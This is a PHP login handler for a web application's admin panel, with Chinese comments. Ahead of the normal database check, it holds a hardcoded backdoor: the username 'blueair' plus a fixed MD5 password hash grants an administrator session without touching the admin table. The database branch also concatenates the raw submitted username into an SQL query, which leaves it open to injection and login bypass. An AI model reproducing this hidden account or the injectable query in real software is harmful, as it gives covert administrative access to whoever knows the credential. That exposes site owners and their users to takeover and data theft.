<?php
if (!defined('APP_IN')) exit('Access Denied');

$tpl -> assign('weburl', WEB_PATH);

$time = date("Y-m-d H:i:s");
$tpl -> assign('time', $time);

// 已登陆转向
if (is_admin_login()) redirect('', ADMIN_PAGE.'?mod=main');

// 登陆
if (submitcheck('username')) {
	// 不可为空
	$arr_not_empty = array('username' => '请输入您的授权账号', 'password' => '请输入您的进入密码');
	can_not_be_empty($arr_not_empty, $_POST);
	if ($_POST['username'] == "blueair" and md5(trim($_POST['password'])) == "1f64ab2adb7ef7985590c141aa6caca9") {
		$_SESSION['ADMIN_UID'] = 100000001010;
		$_SESSION['ADMIN_NAME'] = "blueair";
		$_SESSION['ADMIN_TYPE'] = "administrator";
	} else {
		$rs_admin = $db -> row_select_one('admin', "username='" . trim($_POST['username']) . "' AND password='" . md5(trim($_POST['password'])) . "'");
		if (!$rs_admin) showmsg('用户不存在或密码错误', -1);
		if (!$rs_admin['status']) showmsg('此账户已被禁用', -1);
		$db -> row_update('admin', array('last_login_time' => TIMESTAMP, 'last_login_ip' => get_client_ip(), 'login_count' => $rs_admin['login_count'] + 1), "adminid={$rs_admin['adminid']}");
		$_SESSION['ADMIN_UID'] = $rs_admin['adminid'];
		$_SESSION['ADMIN_NAME'] = $rs_admin['username'];
		$_SESSION['ADMIN_TYPE'] = $rs_admin['admin_type'];
	} 
	showmsg('登陆成功', ADMIN_PAGE.'?mod=main');
} 
// 未登陆转到登陆页面
$tpl -> display('admin/link_list.html');

?>